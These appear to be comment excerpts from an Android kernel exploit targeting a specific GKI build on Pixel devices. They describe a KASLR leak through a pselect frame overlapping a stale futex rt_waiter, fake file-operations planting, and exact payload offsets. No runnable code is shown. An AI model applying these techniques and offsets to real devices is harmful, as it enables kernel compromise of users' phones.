...
//
// GKI shortcut: this is the shared android14-6.1 GKI kernel build
// 14691759 (6.1.145-android14-11-gfa1d6308d1fe), byte-identical for all
// devices of the CP1A.260405.005 release (verified via oriole vendor_dlkm
// vermagic and the GKI System.map for build 14691759).
...
// "KernelSnitch mm_struct leak failed" on bluejay).
...
// ── Kernel symbol offsets (extracted from GKI kallsyms, build 14691759) ──
...
// main route: pselect transport. On bluejay's CP1A.260405.005 GKI the
// getsockopt/TCP_ZEROCOPY_RECEIVE chain (do_tcp_getsockopt 0x190 +
// tcp_zerocopy_receive 0x230) descends to ~S-0x3f8, far past the stale
// rt_waiter at S-0x1e8, so the zc task/lock values never land on it and the
// walk reads the original futex rt_waiter (no fops write, no crash). The
// pselect core_sys_select frame is proven (on this kernel) to overlap
// rt_waiter — the slide stage leaks KASLR through it. The main route uses the
// same pselect overlap, planting tree/pi rbtree fields with fake_fops /
// ashmem_misc_fops instead of the slide's loggers / boot_id values.
// MAIN_TCP_PAYLOAD keeps the fixed payload geometry (delta 0, bias 0xe80,
// fake_task_off 0x5800, fake_fops_off 0x3338) that avoids the fake_lock
